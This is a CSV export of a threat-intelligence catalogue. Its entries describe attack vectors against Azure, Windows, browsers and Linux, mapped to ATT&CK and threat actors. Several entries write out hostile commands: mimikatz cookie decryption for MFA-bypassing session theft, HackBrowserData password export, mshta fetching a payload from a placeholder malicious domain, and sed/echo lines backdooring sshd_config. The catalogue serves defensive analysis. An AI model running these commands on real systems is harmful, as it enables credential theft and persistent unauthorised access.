UUID,Name,Type,Tlp,Description,Version,Created,Modified,Childs,Parents,Chaining,Threat Actors,ATT&CK
2743bf18-3b86-4721-bf3e-153dcda0b149,Azure - Valid Credentials,Threat Vectors,clear,"This threat vector within the Initial Access phase represents a significant risk 
in Azure environments. This attack technique—formally designated around adversaries 
acquiring and abusing legitimate authentication credentials to gain access to Azure 
resources or Azure Active Directory (AzureAD).

### Example Attack Scenario

- The attacker logs in directly to the Azure Portal or via CLI (e.g., `az login`) 
using valid credentials.
- Once inside, the attacker can enumerate resources, exfiltrate data, manipulate 
configurations, or leverage the account for further attacks, depending on the permissions 
granted to the compromised account.
- If privileged service principal credentials are obtained, the attacker can use 
secrets or certificates to automate access and escalate privileges.

### Attack Goals and Impact

- **Primary Goals:**
  - Establish initial access to Azure environments in a stealthy, low-noise manner 
  by using valid, non-malicious authentication flows.
  - Access sensitive data, manipulate cloud resources, and potentially escalate 
  privileges or persist within the target environment.

- **Impact:**
  - Complete compromise of Azure resources accessible by the stolen account (files, 
  databases, VMs, identity services, etc.).
  - Potential for privilege escalation if the account is eligible for higher roles 
  or Privileged Identity Management (PIM).
  - Ability to create backdoors, perform lateral movement, and evade detection (since 
  all actions appear legitimate).
  - Depending on account privileges, ransomware deployment, data exfiltration, and 
  broad access to organizational assets may occur.

### Attack Flow and Methodology

1. **Reconnaissance**
  - Attackers gather information on users or service principals, identifying potential 
  targets through open-source intelligence, misconfigurations, or enumeration of 
  publicly accessible resources.

2. **Credential Acquisition**
  - Common methods: phishing (email/SMS/voice), brute-force/password spraying, 
  harvesting credentials from previous breaches, or exploiting cloud API/application 
  misconfigurations.
  - Service principal secrets/certificates may be obtained from publicly accessible 
  repositories, misconfigured code, or automation scripts.

3. **Authentication**
  - Adversary logs into Azure Portal or invokes cloud APIs using the acquired credentials.
  - For service principals: authentication occurs via CLI or programmatic access 
  using certificates/secrets.

4. **Enumeration and Expansion**
  - Mapping out resources, roles, permissions; searching for sensitive data or 
  additional high-value targets.
  - Assessing role activation and privilege escalation opportunities (e.g., via 
  PIM or RBAC misconfigurations).

5. **Execution of Attack Objectives**
  - Data exfiltration, sabotage, account persistence (creating additional user 
  accounts or credentials), lateral movement to other resources, or exploitation 
  for financial gain.
  - Actions are typically performed under the guise of the legitimate account to 
  avoid detection.

6. **Persistence and Defense Evasion**
  - Adversaries may create new accounts, modify access policies, or abuse automation 
  to ensure continued access.
  - Use of valid credentials enables attackers to blend with legitimate user activity, 
  thus evading many traditional security detection systems.
",2,2025-08-14,2025-09-04,,,"{'sequence::preceeds': ['a8c7b250-a2d4-4a0d-82f8-23dc99c77d7b', '66aafb61-9a46-4287-8b40-4785b42b77a3', 'c698fc79-3ed6-44a7-a9d7-bc447600e4c3', '5d43ef75-4637-4a75-b1ed-6716052cff0e', '60c5b065-7d06-4697-850f-c2f80765f10b', '6e988fa7-69c9-4aef-897c-a34fa5066dac', '78d5e363-14db-40c0-a1c4-4ba02a3e60d4', '2fd1cddb-c66d-4a99-9779-31e32b67495e', '20bd3620-b13b-4895-b291-b1a26bd9aef3', 'f18be76e-f2b3-410a-80c5-d67e7b8e7b03', '50c7e353-ac1c-48a7-8c98-2515b45f31f4', '23f6a192-a25d-48b8-a235-7bb55e483682']}","APT28, APT29, APT33, APT5, Scattered Spider, HAFNIUM, [Enterprise] Ke3chang, LAPSUS","T1078.004, T1110, T1555"
37381f28-ad9f-40c3-80f8-d8a82d6ce9a3,Resource Secret Reveal in Azure,Threat Vectors,clear,"The following threat vector involves adversaries accessing sensitive secrets, keys, 
or credentials stored or used by Azure resources such as KeyVaults, Storage Accounts, 
Automation Accounts, or within deployment histories.

### Example Attack Scenario

An attacker with sufficient privileged access in Azure exploits misconfigured permissions, 
allowing them to access a Storage Account and execute the `listkeys` action. This 
reveals access keys that grant full control over the account's data. Alternatively, 
by editing or viewing Azure Automation Account runbooks or Resource Group deployment 
history, the attacker discovers embedded credentials or secrets used in automation 
processes, which may then be used to escalate privileges or move laterally within 
the environment.

### Attack Goals and Impact

- **Primary goal:** Exfiltrate sensitive secrets, such as Storage Account access 
keys, service principal credentials, KeyVault secrets, or any plaintext credentials 
exposed in ARM templates or automation runbooks.
- **Impact:** Once these secrets are exposed, attackers can impersonate service 
identities, gain unauthorized access to data, break the integrity and confidentiality 
of cloud services, or launch further attacks including data exfiltration, lateral 
movement, persistence, or privilege escalation.

### Attack Flow and Methodology

- **Reconnaissance:** Identifies potential resources containing secrets, such as 
Storage Accounts, Automation Accounts, or deployment resource groups.
- **Execution:** 
    - For Storage Accounts: Executes `Microsoft.Storage/storageAccounts/listkeys/action` 
    to dump access keys.
    - For Automation Accounts: Edits or reviews runbooks to extract embedded credentials.
    - For Resource Groups: Reads deployment history to extract secrets/credentials 
    embedded in ARM templates.
- **Objective:** Uses the exfiltrated secrets to access additional resources, escalate 
privileges, or maintain persistence in the Azure environment.
",1,2025-09-15,2025-09-15,,,"{'atomicity::implemented': ['b1593e0b-1b3b-462d-9ab6-21d1c136469d', '53f4e2f0-7d11-4629-bb26-905993a589db', '81338b90-f80c-40cc-8a57-ba97cdf86948'], 'support::enabled': ['2743bf18-3b86-4721-bf3e-153dcda0b149'], 'support::synergize': ['bcf3bb96-ed97-4853-98ab-937c2d214f4e']}",,"T1552, T1003, T1555"
02810748-52b5-4d3a-a788-29a948538cd2,Admin SMB shares privilege escalation exploit,Threat Vectors,clear,"One of the most common ways adversaries leverage SMB and Windows Admin
Shares is in conjunction with another technique, T1570: Lateral Tool
Transfer. In other words, they move payloads from one endpoint to another
and execute them. Adversaries do this with native utilities like net.exe or
through functionality provided by command and control (C2) frameworks - to
name just a couple of the many options available. Additionally, adversaries
can use Admin Shares for privilege escalation using tools like PsExec, a 
Sysinternals tool that enables remote system management.

### Possible patterns of malicious activity

- Remote file copy and retrieval - attackers can use tools such as SMBexec to 
create a temporary share to copy files to and then remotely parse their 
contents. An adversary could accomplish this similarly by leveraging tools 
like WMIexec or MMCexec.

- Lateral movement and privilege escalation - Most C2 Frameworks provide 
built-in functionality for lateral movement or privilege escalation utilizing 
PsExec-like functionality. In the case of Cobalt Strike, beacons leverage the 
Service Control Manager to copy a binary to the ADMIN$ share on the target 
endpoint and leverage a service for execution.

Common offensive and dual-use tools that leverage SMB/Windows Admin Shares 
include:

- PsExec
- Impacket's SMBexec and WMIexec
- `net.exe`
- Probably all C2 frameworks (commercial and open source)
",1,2025-07-29,2025-08-26,,,"{'atomicity::implements': ['75415bc5-6615-487e-a69c-7a4ffc196996'], 'sequence::succeeds': ['f33a693b-04cd-476e-9067-9deab561e55a']}","[Enterprise] APT39, APT39","T1210, T1078, T1021.002, T1570"
78683822-44dc-41ac-8fef-b5f0968743c9,Malicious Software Dependencies Faking Known Packages,Threat Vectors,clear,"Adversaries maymimick known and trusted software packages and
distributors, with the intent to be mistaken for the original developer,
and thus deliver malicious code that will be embedded in the
victim's applications. They may use sophisticated automation
to appear convincing and fool the target. Once delivered, the package may
contain any payload, from crypto mining, to credential theft, command and control etc.",3,2022-04-05,2025-10-01,,,,,T1195
b954303c-0ad0-4dc0-b5ca-492c3de9cd53,Collecting sensitive information via custom script extensions,Threat Vectors,clear,"Custom Script Extensions in Azure are powerful automation tools for configuring 
and managing Virtual Machines (VMs). However, attackers can exploit these extensions 
to collect sensitive information in a variety of ways.

## Credential Harvesting
- **Stored Credentials:** Attackers deploy scripts that search for credentials stored 
in plaintext files, configuration files, or environment variables.
- **Credential Managers:** Scripts can target credential managers or vaults such 
as Azure Key Vault, Windows Credential Manager, or third-party vaults to extract 
stored credentials.

## Configuration Files and Secrets
- **Configuration Files:** Scripts can systematically search for and exfiltrate 
configuration files containing sensitive data like database connection strings, 
API keys, or other secrets.
- **Environment Variables:** Attackers can extract environment variables that hold 
sensitive configuration or authentication information.

## Log Files and Audit Trails
- **Log Files:** Scripts can access and exfiltrate log files that may contain sensitive 
information, such as authentication logs, database logs, or application logs.
- **Audit Trails:** Attackers can collect and exfiltrate audit trails that record 
administrative actions or other sensitive activities.

## Memory Scraping
- **Running Processes:** Scripts can be designed to scrape memory from running processes 
to extract sensitive information like session tokens, encryption keys, or other 
in-memory data.
- **DLL Injection:** Attackers can use DLL injection techniques within scripts to 
extract sensitive data from running processes.

## Network Traffic Interception
- **Network Sniffing:** Scripts can enable network sniffing tools to capture sensitive 
information transmitted over the network.
- **Proxy Servers:** Attackers can configure proxy servers via scripts to intercept 
and log network traffic, capturing sensitive data in transit.

## Exploitation of Vulnerabilities
- **Unpatched Software:** Attackers can exploit vulnerabilities in unpatched software 
to gain elevated privileges and execute scripts that collect sensitive information.
- **Misconfigurations:** Misconfigurations in the VM or the environment can be exploited 
to deploy and run malicious scripts.

## Data Exfiltration Channels
- **External Storage:** Scripts can exfiltrate collected data to external storage 
solutions such as Azure Blob Storage, external servers, or other cloud storage services.
- **Email Exfiltration:** Attackers can use scripts to send sensitive information 
via email to an external address.
- **Command and Control (C2) Servers:** Scripts can communicate with C2 servers 
to exfiltrate data and receive further instructions.

## Persistent Data Collection
- **Scheduled Tasks:** Attackers can create scheduled tasks or services that periodically 
execute scripts to collect and exfiltrate sensitive information over time.
- **Backdoor Scripts:** Scripts can be designed to act as backdoors, allowing attackers 
to execute commands and collect data as needed.
",1,2025-06-11,2025-06-11,,,,,"T1059, T1651, T1119"
630f420b-b844-42f1-8be1-d367b3734024,Mimikatz browser cookie extraction,Threat Vectors,clear,"We describe how an attacker could extract cookies using the example of the Chrome browser.

Chrome stores cookies in the following location in a SQLite database:
%localappdata%GoogleChromeUser DataDefaultCookies

The cookies for a given user are encrypted using keys tied to that user via the
Microsoft Data Protection API (DPAPI). To access the cookie database and decrypt 
the cookies, an adversary can use the following mimikatz command:

dpapi::chrome /in:""%localappdata%GoogleChromeUser DataDefaultCookies"" /unprotect

Alternatively, adversaries could execute the following from the command line:
mimikatz.exe privilege::debug log ""dpapi::chrome /in:%localappdata%googlechromeUSERDA~1defaultcookies /unprotect"" exit

Using either of these options will provide the browser cookies.


## PtC attack scenario

1. A sysadmin uses regularly the Azure management portal, MFA is enabled with the authenticator
   app on his mobile device.
    
   He has clicked on a phishing email or his system has been compromised by some other means,
   and now an attacker is able to execute code within the user context.

2. Execute Mimikatz when running as the user
   mimikatz.exe privilege::debug log ""dpapi::chrome /in:%localappdata%googlechromeUSERDA~1defaultcookies /unprotect"" exit
    
   Attackers look for the Azure authentication cookies, including ESTSAUTH, ESTSAUTHPERSISTENT and ESTSAUTHLIGHT.
    
3. To pass the cookies into another session to take over the user account, opening Chrome on another server
   and use the “Inspect” interface to insert a cookie.
    
    Add the ESTSAUTH or If ESTSAUTHPERSISTENT cookie. If ESTSAUTHPERSISTENT is available, it is preferred because
    it is generated by the “Stay Signed In” option.     

4. Refresh the page and now attackers are logged into Azure as the user — no MFA required.
",1,2024-11-05,2024-11-05,,,"{'sequence::succeeds': ['7351e2ca-e198-427c-9cfa-202df36f6e2a'], 'atomicity::implements': ['b0d6bf74-b204-4a48-9509-4499ed795771']}","[Enterprise] APT29, UNC2452, [Mobile] Sandworm Team, GreyEnergy",T1111
3f0b4b8e-6017-406a-9461-740d542d0917,Google Calendar service as C2,Threat Vectors,clear,"In some of the reports and analysis a Chinese-affiliated threat actor was
observed abusing Google Calendar to deliver malware and establish Command
and Control (CnC) communication.  

### Abuse of Google calendar

A malware delivered payload has the capability to read and write events with
an attacker-controlled Google calendar. Once executed, this malware creates
a zero minute calendar event at a hardcoded date, with data collected from
the compromised host being encrypted and written in the calendar event
description.  

A threat operator places encrypted commands in calendar events on this date
and next one day, which are predetermined dates also hardcoded into the
malware. The malicious code then begins polling calendar for these events.
When an event is retrieved, the event description is decrypted and the
command it contains is executed on the compromised host. Results from the
command execution are encrypted and written back to another calendar event
ref [1]. 

In several steps below is represented the threat vector pattern how the
threat actor manages to exploit a Google calendar ref [1]. 

- Initial access : The threat actor gains initial access to a victim's
Google account, often through phishing or credential reuse.
- Google calendar creation: As a next step the malicious actor creates
a new Google Calendar event, which is used as a mechanism to deliver
malware to the victim's device.
- Malicious event creation: The threat actor creates a new event in the
victim's Google calendar, which includes a malicious link or attachment.
The event is often titled with a misleading or innocuous name to avoid
suspicion.
- Notification and delivery: When the event is created, Google calendar
sends a notification to the victim's device, which includes the malicious
link or attachment. If the victim interacts with the notification,
the malware is delivered to their device.
- CnC Communication: Once the malware is installed, the threat actor
uses the compromised device to establish CnC communication. The malware
communicates with the threat actor's command and control server, allowing
them to issue commands, exfiltrate data, and further compromise the
victim's network.  

Where

- C2 server - is the attacker controlled calendar. C2 commands are passed as
encrypted google calendar events.
- C2 communication - established from the agent to the attacker controlled
google calendar over HTTPS to Google API, using valid credentials.
- C2 agent - posts computer information into the attacker controlled google
calendar. 

More detailed explanation is provided in ref [1].  

### Used known tactics

- Event titles and descriptions: A Chinese-based threat actor group uses
misleading event titles and descriptions to avoid suspicion and increase
the likelihood of the victim interacting with the malicious event.
- Malicious links and attachments: The threat actor uses malicious links or
attachments in the event to deliver malware to the victim's
device.
- Calendar settings abuse: The threat actor configures the Google calendar
settings to send notifications to the victim's device, ensuring that the
malware is delivered even if the victim doesn't actively check their
calendar.

By abusing Google calendar, the threat actor is able to deliver malware and
establish CnC communication in a way that is difficult to detect and block.
This tactic highlights the importance of monitoring cloud services and
implementing robust security controls to prevent such attacks ref [1], [2].  
",1,2025-06-11,2025-07-04,,,{'sequence::succeeds': ['1a68b5eb-0112-424d-a21f-88dda0b6b8df']},"[Mobile] APT41, APT41","T1566.002, T1204.002, T1190"
662af2da-7017-4899-88fc-e77617a15130,Grager backdoor,Threat Vectors,clear,"A previously unseen backdoor named Grager was deployed against three
organizations in the past - Taiwan, Hong Kong, and Vietnam in April
2024. Trojan.Grager is a second APT malware implant leveraging the
Microsoft Graph API from a multi-step malware campaign abusing
cloud services ref [1, 2].  

The analysis of the backdoor revealed that it used the Graph
API to communicate with a C&C server hosted on Microsoft OneDrive.
Grager was downloaded from a typosquatted URL mimicking an open-
source file archiver 7-Zip (7 zip .msi file) ref [1].  

The .msi dropper, is a Trojanized 7-Zip installer that installs
the real 7-Zip software into the Windows Program Files folder
(C:\Program Files (x86)\7-Zip) along with a malicious DLL named
`epdevmgr.dll`, a copy of the Tonerjam malware, and the encrypted
Grager backdoor into a file named `data.dat` ref [1].   

The backdoor leverages a custom application layer protocol for
communication with its command and control server, allowing it to bypass
traditional network security tools and evade detection. Grager employs
various stealth techniques, such as obfuscation and anti-analysis methods,
to evade antivirus software and remain undetected.  
",1,2024-10-16,2024-10-16,,,,,"T1071, T1105, T1059"
dcccd7e5-9d3f-4b36-853a-5cd18a7ef752,Linux kernel module injection from container,Threat Vectors,clear,"Loadable Kernel Modules (LKM) can be used by adversaries to deliver 
sophisticated and hard to detect rootkits. Each event where kernel modules 
are loaded from a container should be investigated with the exeption of 
Security tools deployed in containers.

An injected kernel module is just code execution, and can in theory do 
more or less anything, but threat actors mostly use this for dwelling and 
for hiding their presence on a system.
",2,2023-01-09,2023-01-10,,,,,T1547.006
cef11e0a-32c7-46c6-8c9c-667d0f1055e2,Use of customervoice.microsoft.com to host Phishing domains,Threat Vectors,clear,"This threat vector is based on real phishing domains built and utilized by
a real, still unknown threat actor. The subdomain 
customervoice.microsoft.com should be blocked on forward proxies by most 
organizations, unless they have legit reasons to have traffic to this, and
legit traffic going there.
",1,2022-10-25,2022-10-25,,,,,"T1566.002, T1566.003"
02311e3e-b7b8-4369-9e1e-74c0a844ae0f,NTLM credentials dumping via SMB connection,Threat Vectors,clear,"### Attack vector related to Outlook vulnerability CVE-2023-23397

**key point: no user interaction**  

An attacker sends an email message with an extended MAPI property with a 
UNC path pointing to an SMB network share on a threat actor-controlled 
server.  

When a vulnerable Microsoft Outlook client (CVE-2023-23397) 
receives in the inbox, it processes that email.  

Without any user interaction, a connection to the remote SMB server is 
established and the user's NTLM negotiation message are passed in the 
hearders.  

The attacker can capture this message tp replay for authentication 
against other systems that support NTLM authentication.  

The attacker may also try to crack the original password if not too 
complex.  

The outbound NTLM negotiation message is passed with SMB and WebDav 
protocols (see Didier Steven's blog).

### Attack vector using a link a user will be enticed to click on

**key point: the user needs to click on the link**  

This attack is a subset of attackers objectives when using spear 
phishing emails with a link in message body or in an attachment.

#### Attack vector using Outlook vulnerability

A vulnerability like CVE-2024-21413, also known as the MonikerLink bug, 
allows remote code execution and the leakage of local NTLM information.  

Moniker-based links exploit a logic flaw in how vulnerable versions
of Outlook process certain file types, causing files to open in
editing mode instead of the sandboxed `Protected View`.  

If the malicious link points to SMB shares controlled by the attacker,
Windows automatically attempts to authenticate using NTLM credentials
enabling threat actors to steal NTLMv2 hashes for initial access.  
",3,2023-03-17,2025-02-24,,,,"[Mobile] APT28, APT28, TA577","T1187, T1190, T1068, T1212"
767f10bd-1947-44e3-b999-5fbf50d99027,Abuse of mshta,Threat Vectors,clear,"Mshta.exe is a legitimate Microsoft binary used for executing 
Microsoft HTML Application (HTA) files. Because mshta.exe is digitally signed 
by Microsoft, malicious actors often abuse it as a ""Living off the Land"" binary 
(LOLBin) to evade detection. Attackers can craft malicious HTA or VBScript code 
and pass it to mshta.exe, effectively bypassing many traditional endpoint 
security controls.  

Threat actors have leveraged mshta.exe to stealthily download and execute 
malicious payloads. By embedding or obfuscating their scripts within HTML 
or JavaScript code, adversaries can launch mshta.exe to pull additional 
malware from remote servers.  

Mshta.exe can also be invoked using command-line arguments that specify 
a remote or local HTA file. An example of such an abuse might look like:  

```bash
mshta.exe https://malicious[.]domain/payload.hta
```

or

```bash
mshta.exe C:\Path\To\MaliciousScript.hta
```

Once executed, mshta.exe runs with the same privileges as the invoking user 
(or higher, if misconfigurations or stolen credentials allow for elevated privileges).
",1,2025-01-09,2025-01-09,,,{'atomicity::implements': ['d5039f2c-9fcc-4ba3-ad6a-da8c891ba745']},"[Enterprise] APT29, UNC2452, [ICS] Wizard Spider, UNC1878",T1218.005
61ddc240-e5a6-4ca8-ae77-6b471b498913,Code execution via custom script extensions in Azure,Threat Vectors,clear,"The Azure Custom Script Extension (CSE) is designed to automate post-deployment 
tasks on virtual machines (VMs) by downloading and executing scripts provided by 
users. While this is intended for legitimate configuration and management, it introduces 
a powerful threat vector: attackers with sufficient Azure permissions can leverage 
CSE to execute arbitrary code as SYSTEM (Windows) or root (Linux) on any accessible VM.

### How Attackers Exploit This Vector

- **Privilege Abuse**: If an attacker compromises an account with the *Virtual Machine 
Contributor* role or any role that grants `Microsoft.Compute/virtualMachines/extensions/write` 
permissions, they can deploy or update custom script extensions on target VMs.
- **Arbitrary Code Execution**: The attacker can specify any script (PowerShell, Bash, etc.) 
to be downloaded from a remote location (such as a malicious website or public repository) 
and executed with the highest local privileges on the VM.
- **Bypassing Network Controls**: Because CSE operates through the Azure control 
plane, it does not require direct network access to the VM. Scripts can be executed 
even if RDP or SSH ports are closed, bypassing traditional network-based restrictions.
- **Persistence and Lateral Movement**: Attackers can use CSE to establish persistence 
(e.g., by installing backdoors), harvest credentials, or pivot to other resources 
within the environment.
- **Stealth**: Since CSE operations are part of normal Azure VM management workflows, 
malicious activity may blend in with legitimate administrative actions.

### Example Attack Scenario
- An attacker uploads a malicious script to a public storage location.
- Using compromised credentials with the necessary Azure permissions, the attacker 
configures the CSE on a target VM to download and execute the script.
- The script runs as SYSTEM/root, granting full control over the VM, and can perform 
actions such as installing malware, mining cryptocurrency, exfiltrating data, or 
creating new privileged accounts.

### Real-World Impact
- **Observed Cases**: There have been documented incidents where attackers used 
the CSE to deploy cryptocurrency miners across multiple customer environments by 
referencing a malicious script hosted on a public GitHub repository.
- **Scope of Access**: This technique is not limited to individual VMs; it can be 
used on VM scale sets and Azure ARC-managed resources, amplifying the potential impact.
- **No Network Barriers**: The attack is effective regardless of the VM’s network 
security group settings or firewall rules, as it leverages the Azure management plane.
",3,2025-05-15,2025-09-08,,,"{'support::enabled': ['140907eb-c9fb-4330-9d71-656422388b2b', '2743bf18-3b86-4721-bf3e-153dcda0b149']}",,"T1555, T1190, T1204"
942ed69c-700a-469a-9591-07b87815a909,Azure - Storage Account Replication,Threat Vectors,clear,"The following threat vector enables adversaries to misuse Azure Storage's replication 
features for data exfiltration or to facilitate other attacks with significant business impact.

## Example Attack Scenario

An attacker compromises access to a victim's Azure Storage account, obtaining enough 
permissions to configure **object replication**. The attacker then creates their 
own storage account in a different Azure tenant or region and establishes a replication 
policy from the victim's storage. As a result, sensitive or operational data is 
asynchronously and automatically copied from the victim’s container to the attacker's 
environment—potentially outside tenant or even cross-cloud provider lines—without 
further interaction. The attacker can now access the replicated content at will, 
maintaining persistence and visibility even if their original access to the victim 
account is revoked.

## Attack Goals and Impact

- **Exfiltration**: The primary goal is the **covert exfiltration of data**—potentially 
at massive scale and with minimum detection, because the process leverages legitimate 
replication mechanisms.
- **Persistence and Stealth**: By using cross-region or cross-tenant replication, 
an attacker ensures ongoing access to copied data even after being discovered and 
evicted from the original environment.
- **Evasion and Regulatory Breach**: Since Azure Storage object replication can 
occur across geographical boundaries, this attack can make detection harder and 
may also result in regulatory compliance violations (e.g., unauthorized cross-border 
data transfers).
- **Potential for Secondary Impact**: With replicated data, attackers may enable 
ransomware (encrypting or destroying primary data, but retaining a copy elsewhere), 
enable further attacks by gleaning credentials or configuration details from exfiltrated 
files, or deliver **malware** to victim environments using inbound replication.

## Attack Flow and Methodology

1. The adversary enumerates storage resources, searches for containers of interest, 
and assesses the feasibility of replication configuration.
2. Using their access, the attacker creates an **object replication policy** from 
victim storage to a destination account they control, potentially in a different 
geographic region or Azure tenant.
    - Outbound replication exfiltrates data; inbound can inject payloads.
    - Cross-tenant replication may currently require explicit configuration, and 
    new Azure defaults restrict this, but legacy or misconfigured accounts remain vulnerable.
3. Replication occurs asynchronously, repeatedly syncing new or changed objects. 
The attacker harvests data from their own account, separate from the victim’s monitoring 
and controls, thus bypassing many detection points.
4. Depending on their goal, the attacker may leave replication running for long-term 
persistence or attempt to erase traces from the victim environment.
",1,2025-09-08,2025-09-08,,,"{'support::enabled': ['53f4e2f0-7d11-4629-bb26-905993a589db', '41f57a57-1ed6-407e-bb70-a0f6ab52af10', '2d7ed070-e5c5-4796-b150-ea1d02ed1785'], 'sequence::preceeds': ['2743bf18-3b86-4721-bf3e-153dcda0b149']}",Storm-0501,"T1567.002, T1078.004, T1530"
60c5b065-7d06-4697-850f-c2f80765f10b,Changes to Azure infrastructure deployed through Azure CLI,Threat Vectors,clear,"A threat actor in control of the prerequisites may attempt to use the Azure
CLI to perform changes either to the endpoint from which the CLI is 
accessed or on remote infrastructure, user accounts, service principals, 
or configurations. 

A threat actor can only perform changes that are allowed in the scopes of
credentials, temporary credentials, or service principals that the threat 
actor has control of, barring usage of a vulnerability in Azure to allow
more than that.
",1,2022-12-22,2022-12-22,,,,,T1059
cd1baed8-3ea8-42e1-a27d-9da9ddb2f5b8,Switching off forced signed commits for GitHub repository,Threat Vectors,clear,"Development and DevOps teams may turn on signed commits to ensure that an 
attacker cannot commit code to a code repository of an organization by 
merely succesfully stealing an OAuth token of a developer. With forced 
commits, the attacker will be blocked from committing code changes to a
repository, essentially limiting the attacker from attaining lateral 
movement or similar objectives, unless the attacker turns off the forced 
commit policy. 
",1,2022-11-28,2022-11-28,,,,,T1562
ba88c4a0-bf3b-46cb-b022-050ae22abce8,HackBrowserData browser data export,Threat Vectors,clear,"HackBrowserData is a command-line tool for decrypting and exporting data
(passwords, history, cookies, bookmarks, credit cards, download history,
localStorage and extensions) from the browser. 

It supports the most popular browsers on the market and runs on Windows, macOS and Linux.

Usage examples:

## Automatic scan of the browser on the current computer, 
   outputting the decryption results in JSON format and compressing as zip.

PS C:\Users\JohnDoe\Desktop> .\hack-browser-data.exe -b all -f json --dir results --zip

PS C:\Users\JohnDoe\Desktop> ls -l .\results\
    Directory: C:\Users\JohnDoe\Desktop\results

## Run with custom browser profile folder, using the -p parameter to specify the
   path of the browser profile folder.
  
PS C:\Users\JohnDoe\Desktop> .\hack-browser-data.exe -b chrome -p ""C:\Users\User\AppData\Local\Microsoft\Edge\User Data\Default""

[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_creditcard.csv success  
[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_bookmark.csv success  
[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_cookie.csv success  
[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_history.csv success  
[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_download.csv success  
[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_password.csv success  
",1,2024-11-05,2024-11-05,,,{'atomicity::implements': ['b0d6bf74-b204-4a48-9509-4499ed795771']},,T1111
b32ced71-138b-4076-8376-4f13161af4b0,Alteration of sshd_config file,Threat Vectors,clear,"This threat vector highlights the risk associated with unauthorized access or 
alteration of the `sshd_config` file on Linux systems. Adversaries who manage 
to gain elevated privileges (root or sudo) can modify SSH service parameters 
in `sshd_config` to allow additional keys, redirect ports, or weaken 
authentication requirements.  

Possible scenario done by a threat actor :

### Adding Rogue SSH Keys
An attacker with root or sudo privileges could append a malicious public key to 
the authorized_keys directive in sshd_config. For instance:

```bash
echo ""AuthorizedKeysFile /etc/ssh/my_malicious_keys"" >> /etc/ssh/sshd_config
```
They might then place their public key in that file. This allows them to log in 
via SSH without needing a password, often bypassing standard detection.  

### Enabling Root Login
If an organization has wisely disabled direct root login, an attacker could revert 
that setting in sshd_config:

```bash
sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
```
By doing so, they allow themselves to authenticate as root directly.  

### Allowing Password Authentication
In secure environments, SSH often requires key-based authentication. 
An attacker might weaken this by enabling password-based access and choosing 
easy-to-guess credentials:

```bash
sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
```
Once changed, brute-force or credential-stuffing techniques become more feasible, 
helping the adversary maintain illicit access.  

### Redirecting SSH Ports
Defenders commonly monitor TCP port 22 for suspicious activities. An attacker 
could modify sshd_config to run SSH on a high or less-monitored port:

```bash
sed -i 's/^Port 22/Port 2222/' /etc/ssh/sshd_config
```
This tactic helps attackers blend into legitimate traffic patterns or bypass 
perimeter defenses that only monitor the default SSH port.  

### Creating Hidden Backdoors
Attackers may add an additional Match block in sshd_config that grants special 
privileges to a specific user or from a specific IP range:

```bash
echo ""Match User hiddenuser
    X11Forwarding yes
    AllowTcpForwarding yes"" >> /etc/ssh/sshd_config
```
This configuration could stealthily enable features like port forwarding, 
further helping attackers evade detection and maintain persistence.  
",1,2025-01-07,2025-01-07,,,,"[Enterprise] APT29, UNC2452, [ICS] Wizard Spider, UNC1878, [Enterprise] TeamTNT, TeamTNT",T1098.004
